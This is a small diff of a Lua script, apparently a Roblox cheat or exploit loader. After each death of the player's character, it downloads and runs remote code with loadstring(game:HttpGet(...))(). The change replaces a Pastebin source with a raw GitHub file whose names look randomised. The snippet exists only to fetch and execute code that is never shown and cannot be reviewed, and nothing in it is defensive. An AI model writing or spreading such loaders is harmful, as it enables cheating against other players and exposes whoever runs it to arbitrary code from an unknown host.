@@ -13,5 +13,5 @@ while wait() do
     while game:GetService("Players").LocalPlayer.Character.Humanoid.Health > 0 do
         wait()
     end
-    loadstring(game:HttpGet("https://pastebin.com/raw/0emZTnuW", true))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ghjrfiudfjrhu/ejkhhkjfhkgi/main/refhuhg.lua", true))()
 end
